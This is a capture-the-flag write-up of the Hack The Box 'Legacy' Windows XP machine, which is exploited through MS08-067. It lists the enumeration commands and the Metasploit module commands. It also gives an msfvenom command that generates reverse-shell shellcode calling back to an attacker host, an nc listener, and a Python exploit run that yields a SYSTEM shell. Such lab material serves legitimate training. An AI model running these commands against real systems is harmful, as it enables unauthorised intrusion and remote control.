
# HTB - Legacy

Legacy - 10.10.10.4

![](/images/legacy/1. legacy.png "Legacy Info Card")

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

Legacy is another early, easy machine from the Hack the Box platform.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

To root this machine we will use Metasploit to exploit a vulnerability in NetAPI32.dll through the Server Service and a specially crafted Remote Procedure Call, as documented in MS08-067.  This particular exploit achieves remote code execution as NT/AUTHORITY SYSTEM (root) level privileges instantly.
After using Metasploit, we will also find a python script which exploits the same vulnerability, generate our own shellcode using msfvenom, and then run the python script for manual exploitation.

-1- nmap

-2- smbclient

-3- msfconsole

-4- msf module: auxiliary/scanner/smb/smb_version

-5- msf module: exploit/windows/smb/ms08_067_netapi

-6- python scripting

-7- msfvenom to generate shellcode for use in the python script

-8- nc -lvnp

<p>&nbsp;</p>

=======================================================

## Scanning and Enumeration

=======================================================

First off, we will start with a standard nmap command to see what initially shows as open:

    nmap -A -T4 10.10.10.4

![](/images/legacy/2. nmap.png "nmap")

So it looks like a Windows XP, possibly SP3 machine.

Ports 139, 445, and 3389 are open.  

Here are some further details from the scan:

![](/images/legacy/3. nmap.png "nmap")

Looks like we have some access via smb, port 139.  

We can try smbclient:  smbclient -NL 10.10.10.4

smbclient attempts to use smb to connect to port 139 by default

-N means no login info, anonymous login attempt

-L means list shares

10.10.10.4 is the IP address of the target

    smbclient -NL 10.10.10.4

![](/images/legacy/4. smbclient-1.png "smbclient")

No joy there. We can also try to force a certain level of the smb protocol by adding the option “--option='client min protocol=NT1'”

    smbclient --option='client min protocol=NT1' -NL 10.10.10.4

![](/images/legacy/5. smbclient-2.png "smbclient")

Still no luck, but we can also try Metasploit's smb_scanner:

    msfconsole

    use auxiliary/scanner/smb/smb_version

    show options

![](/images/legacy/6. msf smb_version.png "smb_scanner")

We must set the target via the RHOSTS (or rhosts, this is not case sensitive) variable. 

    set rhosts 10.10.10.4
    
    run

![](/images/legacy/7. msf smb_version_2.png "smb_scannner")

These scan results show it to be a Windows XP SP3 machine via port 445.

Next, let's see what Google results we can find:

![](/images/legacy/8. google_xp_smb_exploit.png "Google search")

The top two results mention MS08-067, so that is our first avenue we will explore.

The rapid7.com link will most likely contain details for a Metasploit module, so we can start there: [https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi)

![](/images/legacy/9. rapid7_ms08-067.png "Rapid7")

![](/images/legacy/10. rapid7_module_options.png "msf module options")

So, here we have the description of the exploit and the msf commands to run.  Let's move on to exploitation via Metasploit:


<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================

In your metasploit window, let's confirm the module is still present:

    search ms08-067

![](/images/legacy/11. msf_search.png "msf search")

Next we load the module:

    use exploit/windows/smb/ms08_067_netapi

Alternatively, if you searched for it you can reference by the # listed above: 

    use 0
    
First up, we want to see our options:

    show options

![](/images/legacy/12. msf_use.png "msf use")

Looks like we only need to set the RHOSTS setting and then run it:

    set rhosts 10.10.10.4

    run

![](/images/legacy/13. meterpreter.png "meterpreter")

And we have a meterpreter shell!

First two commands you should run anytime you have a meterpreter shell on a Windows machine:

    getuid

    sysinfo

![](/images/legacy/14. meterpreter_2.png "meterpreter")

NT AUTHORITY\SYSTEM means we have root level access to the machine

And the sysinfo output confirms this is Windows XP, SP3, 32-bit (x86)

Next you can upgrade to a shell to find the flags:

    shell

![](/images/legacy/15. shell.png "shell")

Flags are normally on the desktop of the various users. For Windows XP we need to go to Documents and Settings first:

    cd C:\"Documents and Settings"

![](/images/legacy/16. shell_2.png "shell")

We have users Administrator and john.  Let's get our flags:

    type john\Desktop\user.txt

    type Administrator\Desktop\root.txt

![](/images/legacy/17. flags.png "flags")

And we have our two flags.


<p>&nbsp;</p>
=======================================================

## Manual Exploitation

=======================================================

To exploit manually we will need to download some code to run. The first place we look is on exploit-db.com, so let's re-run our Google search for that site specifically:

![](/images/legacy/18. google_ms08-067_exploit.png "Google")

The last link shown here is for a github.com repo. Since this exploit is so old, we will try the GitHub version first as these tend to be better maintained:
[https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py)

Click on the link then click the “Raw” button to view the raw code.  

![](/images/legacy/19. github_exploit.png "Github")

Copy/paste this raw code into a new python file on your Kali machine.  I'm using gedit and naming the file “smb-exploit.py”

![](/images/legacy/20. smb_exploit.py.png "smb_exploit.py")

Next scroll down until you see a commented section about shellcode:

![](/images/legacy/21. smb_exploit.py_2.png "smb_exploit.py")

So we need to generate our own shellcode and input it below. There are even sample commands for us to use in the comments.  

Since we ran meterpreter payload when exploiting via metasploit above, I am going to use a windows/shell_reverse_tcp payload this time.

My command to generate the shellcode is:  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

For an explanation of the options:

-p is for payload, in this case windows/shell_reverse_tcp

LHOST is our attacking machine where we are going to be listening for the reverse connection

LPORT is the port we want to receive the callback at, 443 in this case

EXITFUNC=thread is an option that provides additional stability in this case

-b is for “bad characters” or bytecode characters that our shellcode should not contain

-f is for format, ‘c’ in this case which would normally be for c code. even though we are using a python script in this case, all we are using is the shellcode. if you use “-f python” it will give you similar shellcode, but formatted differently. 

-a is for architecture, “x86” in this case for a 32-bit machine

--platform is for the type of machine, again in this case Windows

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

![](/images/legacy/22. msfveom_shellcode.png "shellcode")

Copy/paste the shellcode (highlighted in the red box above) into the python exploit. Remove the ‘;’ at the end.

![](/images/legacy/23. shellcode.png "shellcode")

I also edited the comment at the top of that screenshot to show my actual IP address and port used for the shellcode.

Save the python file and run it without any options.  If you have not done “chmod +x smb-exploit.py” yet, do so first.

![](/images/legacy/24. python_script_usage.png "python_script_usage")

So we see example usage here. Since we know this is Windows XP SP3 English from the metasploit scanner earlier, we can choose option 6.  

But before we run our exploit, we need to set up our nc listener in a separate terminal window:

    nc -lvnp 443

![](/images/legacy/25. nc_listener.png "nc listener")

Now back in the first terminal window, we can run the exploit:

    ./smb-exploit.py 10.10.10.4 6 445

![](/images/legacy/26. python_exploit.png "python exploit")

Once you see the ‘Exploit finish’ message, check over in your second terminal window and you should see:

![](/images/legacy/27. nc_connection.png "nc connection")

Here we have a shell on a Windows machine!  Since this is a Windows XP box, “whoami” is not likely to work, but the fact we are in the Windows\system32 directory likely means we are NT AUTHORITY\System, or “root”.  

As a best practice though, run the command “systeminfo” to see what type of machine we are on:

![](/images/legacy/28. systeminfo.png "systeminfo")

![](/images/legacy/29. systeminfo_2.png "systeminfo")

And then onward to collect our flags.  Same as before, change directory into “C:\Documents and Settings” and from there you can issue a single command for each flag file: root.txt and user.txt

![](/images/legacy/17. flags.png "flags")

Success!


<p>&nbsp;</p>
=======================================================

## Final Code

=======================================================

smb-exploit.py: [https://github.com/rax-register/code_examples/blob/master/smb-exploit.py](https://github.com/rax-register/code_examples/blob/master/smb-exploit.py)
    
<p>&nbsp;</p>
=======================================================

## Links & Additional Reading

=======================================================

1. MITRE CVE list entry: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250)
2. Microsoft Security Bulletin entry: [https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)
3. Rapid7 Metasploit module: [https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi)
4. Github Python-based exploit script: [https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py)

<p>&nbsp;</p>
=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>

